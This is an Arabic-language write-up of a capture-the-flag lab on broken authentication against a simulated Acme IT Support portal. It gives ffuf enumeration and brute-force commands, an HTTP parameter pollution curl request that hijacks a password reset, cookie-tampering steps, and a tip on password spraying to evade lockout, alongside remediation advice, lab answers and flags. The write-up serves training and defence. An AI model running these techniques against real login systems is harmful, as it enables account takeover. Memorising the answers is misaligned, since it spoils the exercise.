# غرفة كسر آليات المصادقة (Broken Authentication) - التوثيق الفني الشامل

---

## 1. نظرة عامة على الغرفة والبنية الهيكلية (Room Overview & Architecture)

تُعد المصادقة (Authentication) خط الدفاع الجوهري الأول لأي نظام حاسوبي وتطبيق ويب؛ فهي الحارس المسؤول عن التحقق من هوية الكيان الطالب للوصول قبل فتح الأبواب أمام أذونات وتفويضات النظام. إذا انهارت آلية المصادقة أو وُجد بها عيب منطقي، يفقد التطبيق قدرته على تمييز المستخدم الشرعي من المهاجم، مما يؤدي غالباً إلى الاستيلاء الشامل على الحسابات (Account Takeover) وانهيار سرية وسلامة البيانات.

تستعرض هذه الغرفة دراسة عملية وتشريحية شاملة للثغرات المصنفة تحت مظلة **OWASP Top 10 A07:2021 (Identification and Authentication Failures)**. من خلال معمل تطبيقي يحاكي بوابة دعم فني لمؤسسة ("Acme IT Support")، يتم تطبيق أربع تقنيات هجومية متقدمة: حصر أسماء المستخدمين (Username Enumeration) عبر الفوارق في استجابات الخادم، وكسر نماذج الدخول بالتخمين المزدوج (Brute-forcing via ffuf)، واستغلال العيوب المنطقية وتلويث معلمات بروتوكول HTTP (HTTP Parameter Pollution) لاختطاف روابط استعادة كلمات المرور، والتلاعب بملفات تعريف الارتباط النصية والمجزأة بـ MD5 والمرمزة بـ Base64.

```
+-----------------------------------------------------------------------------------+
|                        BROKEN AUTHENTICATION LAB ARCHITECTURE                     |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Platform (Kali Linux)                     Target: Acme IT Support       |
|  ==============================                     =======================       |
|                                                                                   |
|  1. ffuf Enumeration -----------------------------> /customers/signup             |
|     (Matches: "username already exists")            Reveals: simon, steve, robert |
|                                                                                   |
|  2. ffuf Multi-Wordlist Brute Force --------------> /customers/login              |
|     (Filters Status 200 / Captures 302)             Cracks: steve / thunder       |
|                                                                                   |
|  3. HTTP Parameter Pollution (HPP) ---------------> /customers/reset              |
|     GET: ?email=robert@acmeitsupport.thm            Validates: robert exists!     |
|     POST: email=attacker@customer.acme...           Sends Token to Attacker Inbox!|
|     Account Takeover -----------------------------> Flag: THM{AUTH_BYPASS...}     |
|                                                                                   |
|  4. Cookie Tampering -----------------------------> /cookie-test                  |
|     Cookie: logged_in=true; admin=true              Flag: THM{COOKIE_TAMPERING}   |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. الجمهور المستهدف والمتطلبات المسبقة (Target Audience & Prerequisites)

* **الجمهور المستهدف:**
  - مختبرو اختراق تطبيقات الويب (Web Penetration Testers).
  - مهندسو أمان التطبيقات (AppSec / Product Security Engineers).
  - مطورو الويب والواجهات الخلفية (Backend Developers - PHP/Node.js/Python).
  - محللو المراكز الأمنية (SOC Analysts) والباحثون في برامج مكافآت الثغرات (Bug Bounty Hunters).
* **المتطلبات المسبقة:**
  - فهم أساسيات بروتوكول HTTP (الطلبات، الاستجابات، الفارق بين GET و POST).
  - معرفة عملية بأداة Burp Suite وأداة سطر الأوامر `curl`.
  - الإلمام بأساسيات أدوات التخمين (Fuzzing) وقوائم الكلمات (Wordlists).

---

## 3. أهداف التعلم والمفاهيم الجوهرية (Learning Objectives & Core Concepts)

1. التمييز بين أنواع ثغرات تجاوز المصادقة الأربعة الرئيسية.
2. استغلال رسائل الخطأ التفاضلية (Differential Error Messages) لحصر أسماء المستخدمين الصالحة.
3. إتقان التخمين المزدوج (Cluster Bomb Fuzzing) باستخدام أداة `ffuf` وفلترة استجابات HTTP بدقة.
4. استيعاب الآلية البرمجية لثغرة تلويث المعلمات (HTTP Parameter Pollution - HPP) وسلوك مصفوفة `$_REQUEST` في PHP.
5. اختطاف تدفقات استعادة كلمات المرور وتحقيق الاستيلاء الكامل على الحسابات (Account Takeover).
6. كشف الفروق الجوهرية بين الترميز (Base64) والتجزئة (MD5) والتشفير (AES) واستغلال الكوكيز غير الموقعة.

---

## 4. الأسس النظرية والتشريح التقني (Theoretical Foundations & Technical Deep Dive)

### 4.1 هجمات حصر المستخدمين (Username Enumeration Mechanics)
تحدث هذه الثغرة عندما يُفصح التطبيق عن معلومات داخلية تتعلق بقاعدة البيانات عبر:
* **رسائل الخطأ:** مثل `"An account with this username already exists"` عند التسجيل، أو `"User does not exist"` عند محاولة الدخول.
* **رموز الحالة (Status Codes):** إرجاع 404 عند عدم وجود المستخدم و 200 عند وجوده ولكن بكلمة مرور خاطئة.
* **الفروق الزمنية (Timing Attacks):** استغراق وقت أطول لتشفير التجزئة (Bcrypt) إذا كان المستخدم موجوداً، مقابل الرفض الفوري إذا كان غير موجود.

### 4.2 تلويث معلمات بروتوكول HTTP (HTTP Parameter Pollution)
* **المشكلة البرمجية في PHP:**
  تعتمد الدالة المعيبة على قراءة متغير `$email = $_REQUEST['email']`.
  بما أن `request_order = "GP"` في إعدادات PHP، فإن معلمات POST تكتب فوق معلمات GET.
  عندما يتحقق كود التحقق من صحة الحساب من `$_GET['email']`، يتأكد أن `robert` حساب حقيقي في قاعدة البيانات. وعندما يرسل كود البريد الرابط إلى `$_REQUEST['email']`، فإنه يرسله إلى بريد المهاجم الممرر في جسم POST!

---

## 5. طوبولوجيا المعمل وسطح الهجوم (Practical Lab Topology & Attack Surface)

* **الهدف:** تطبيق Acme IT Support Portal يعمل على المنفذ 80 (`http://MACHINE_IP`).
* **نقاط النهاية وسطح الهجوم:**
  1. `/customers/signup`: نموذج تسجيل مفتوح يسرب وجود المستخدمين.
  2. `/customers/login`: نموذج مصادقة يفتقر لآليات قفل الحسابات ومعدل الطلبات المحدود.
  3. `/customers/reset`: نموذج استعادة كلمة مرور مصاب بثغرة HPP.
  4. `/cookie-test`: نقطة اختبار تتأثر بالتلاعب بملفات تعريف الارتباط.

---

## 6. الأدوات والتقنيات والبروتوكولات (Tools, Technologies & Protocols)

* **الأدوات:**
  - `ffuf` (الأداة الأساسية لحصر المستخدمين وتخمين كلمات المرور).
  - `curl` (لصياغة طلبات HPP المعقدة وتعديل الكوكيز عبر الطرفية).
  - `SecLists` (قوائم الأسماء `names.txt` وقوائم كلمات المرور `10-million-password-list-top-100.txt`).
  - `CrackStation` / `hashlib` (لعكس تجزئات MD5 غير المملحة).
* **البروتوكولات:**
  - HTTP/1.1 (GET/POST methods, URL Query Parameters, Cookie headers).

---

## 7. مصفوفة تنفيذ المهام خطوة بخطوة (Step-by-Step Task Execution Matrix)

| المهمة | الموضوع | الإجراء المنفذ | النتيجة الموثقة |
| :---: | :--- | :--- | :---: |
| **01** | Introduction | تشغيل الآلة وفحص بيئة Acme IT Support | `No answer needed` |
| **02** | Types of Authentication Bypass | تحليل أنماط الثغرات ومفهوم إعادة استخدام البيانات | `Credential Reuse` |
| **03** | Username Enumeration | حصر المستخدمين عبر أداة ffuf وفحص رسالة الخطأ | `simon`, `steve`, `robert` |
| **04** | Brute Forcing a Login Form | كسر بيانات دخول Steve بتخمين القوائم المزدوجة | `steve/thunder` |
| **05** | Logic Flaws (HPP) | اختطاف رابط إعادة تعيين كلمة مرور Robert | العلم `THM{AUTH_BYPASS_COMPLETE}` |
| **06** | Cookie Manipulation | التلاعب بالكوكيز وفك MD5 و Base64 | العلم `THM{COOKIE_TAMPERING}` + 3 حلول |
| **07** | Conclusion | مراجعة استراتيجيات التحصين والانتقال | `No answer needed` |

---

## 8. دليل العمليات الهجومية والتنفيذ العملي (Offensive Security Playbook)

### المرحلة 1: حصر المستخدمين عبر ffuf
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/signup \
     -mr "username already exists"
```
* النتيجة: حصر الحسابات الثلاثة: `robert`, `simon`, `steve`.

### المرحلة 2: كسر نموذج الدخول (Cluster Bomb)
```bash
cat << 'EOF' > valid_usernames.txt
simon
steve
robert
EOF

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/login \
     -fc 200
```
* النتيجة: اكتشاف بيانات الاعتماد: `steve` / `thunder`.

### المرحلة 3: استغلال ثغرة تلويث المعلمات (HPP Account Takeover)
```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=steve@customer.acmeitsupport.thm'
```
* الدخول إلى بريد Steve وقراءة التذكرة الواردة التي تحتوي على رابط إعادة تعيين كلمة مرور Robert.
* تغيير كلمة مرور روبرت، ثم تسجيل الدخول بحسابه وقراءة التذكرة المغلقة لاستخراج العلم: **`THM{AUTH_BYPASS_COMPLETE}`**.

### المرحلة 4: التلاعب بملفات الارتباط
```bash
# 1. Plain text cookie tampering:
curl -s http://MACHINE_IP/cookie-test -H "Cookie: logged_in=true; admin=true"
# -> يُظهر العلم: THM{COOKIE_TAMPERING}

# 2. Reversing MD5 hash 3b2a1053e3270077456a79192070aa78:
# -> القيمة: 463729

# 3. Base64 Decoding VEhNe0JBU0U2NF9FTkNPRElOR30=:
echo -n "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d
# -> القيمة: THM{BASE64_ENCODING}

# 4. Base64 Encoding {"id":1,"admin":true}:
echo -n '{"id":1,"admin":true}' | base64
# -> القيمة: eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

---

## 9. مخطط الدفاع والتحصين والمعالجة الجذرية (Defensive & Remediation Blueprint)

1. **معالجة حصر المستخدمين (Anti-Enumeration):**
   - توحيد رسائل الخطأ في شاشات الدخول والتسجيل: `"Invalid credentials or user already registered"`.
   - إرسال بريد إشعار للمستخدمين المسجلين مسبقاً بدلاً من إظهار الخطأ على الشاشة.
2. **تحصين نماذج الدخول (Anti-Brute Force):**
   - فرض قفل الحساب بعد 5 محاولات فاشلة (Account Lockout).
   - تفعيل المصادقة متعددة العوامل الإلزامية (MFA).
   - تطبيق خوارزمية التأخير التصاعدي (Exponential Backoff).
3. **معالجة ثغرات تلويث المعلمات (HPP Mitigation):**
   - حظر استخدام `$_REQUEST` نهائياً في معالجة العمليات الحساسة.
   - في استعادة كلمة المرور: يجب أن يستعلم الخادم عن البريد الإلكتروني المربوط بحساب المستخدم في قاعدة البيانات داخلياً، مع حظر استقبال أي بريد إلكتروني كمدخل من جانب العميل!
4. **تحصين ملفات الجلسات (Cookie Security):**
   - الاعتماد على جلسات الخادم الموزعة (Server-Side Storage / Redis).
   - توقيع أي بيانات مخزنة لدى العميل باستخدام خوارزميات HMAC-SHA256 المشفرة بمفتاح سري آمن.

---

## 10. الأمن العملياتي وفنون الريد تيم (OpSec & Red Team Operational Tradecraft)

* **التحكم في بصمة هجمات التخمين (Fuzzing Footprint):**
  - في اختبارات الاختراق المعتمدة، تجنب تشغيل `ffuf` بالسرعة القصوى (`-t 40` أو أعلى) على خوادم الإنتاج لتجنب إحداث حرمان من الخدمة (Denial of Service).
  - استخدم أعلام التأخير والتحكم في الخيوط (`-p 0.2 -t 5`).
* **استراتيجية Password Spraying:**
  - لتجاوز آليات قفل الحسابات الفردية، لا تجرب 100 كلمة مرور ضد مستخدم واحد، بل جرب كلمة مرور واحدة شائعة ضد 100 مستخدم.

---

## 11. استخبارات التهديدات الواقعية وحالات دراسية (Real-World Threat Intelligence & Case Studies)

* **هجمات Credential Stuffing ضد المنصات العالمية:**
  - تعرضت منصات مثل PayPal و Roku لهجمات حشو بيانات اعتماد ضخمة تم فيها تجربة مليارات الحسابات المسربة، مما فرض تطبيق التحقق الثنائي التلقائي لجميع العملاء.
* **ثغرات Parameter Pollution في بوابات الدفع الإلكتروني:**
  - تم استغلال ثغرات HPP في بوابات دفع إلكترونية لتغيير حساب التاجر المستلم (`merchant_id`) عن طريق تمرير المعلمة في كل من مسار الـ URL وجسم الطلب، مما أدى لتحويل أموال المشترين لحسابات المهاجمين.

---

## 12. استكشاف الأخطاء ومعالجة الحالات المعقدة (Comprehensive Troubleshooting & Edge Cases)

* **المشكلة:** أداة `ffuf` تعيد جميع الطلبات كاستجابات ناجحة أو مكررة.
  - **السبب:** عدم ضبط علم التصفية المناسب (`-fc` لحجب كود الحالة أو `-fs` لحجب الحجم الثابت لصفحة الخطأ).
  - **الحل:** اعترض طلباً خاطئاً يدوياً في المتصفح وافحص حجم الاستجابة بدقة (Length/Size)، ثم مرر القيمة لعلم `-fs`.
* **المشكلة:** عدم وصول رسالة إعادة تعيين كلمة المرور إلى صندوق بريد العميل.
  - **السبب:** عدم مطابقة اسم المستخدم بدقة في أمر `curl`، أو وجود خطأ إملائي في النطاق `@customer.acmeitsupport.thm`.

---

## 13. التحقق المعرفي والتقييم الذاتي (Knowledge Verification & Self-Assessment)

1. كيف تؤدي الفوارق في استجابات نماذج التسجيل إلى تسهيل كسر كلمات المرور لاحقاً؟
2. لماذا يعتبر استخدام مصفوفة `$_REQUEST` في لغة PHP ممارسة برمجية محفوفة بالمخاطر؟
3. ما هو الفارق الجوهري بين ترميز Base64 وتشفير AES من المنظور الأمني؟
4. كيف تحمي آلية قفل الحسابات (Account Lockout) ضد التخمين التقليدي، وكيف يلتف المهاجم حولها باستخدام Password Spraying؟

---

## 14. المراجع والقراءات المتقدمة (References & Further Reading)

* [ملف المراجع والتوثيق المعتمد للغرفة](../../02-BROKEN-AUTHENTICATION/REFERENCES.md)
* [الملاحظات التقنية والشروح المعمقة](../../02-BROKEN-AUTHENTICATION/ADDITIONAL-NOTES.md)
* [مصفوفة مهام وحلول الغرفة](../../02-BROKEN-AUTHENTICATION/TASKS.md)
* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
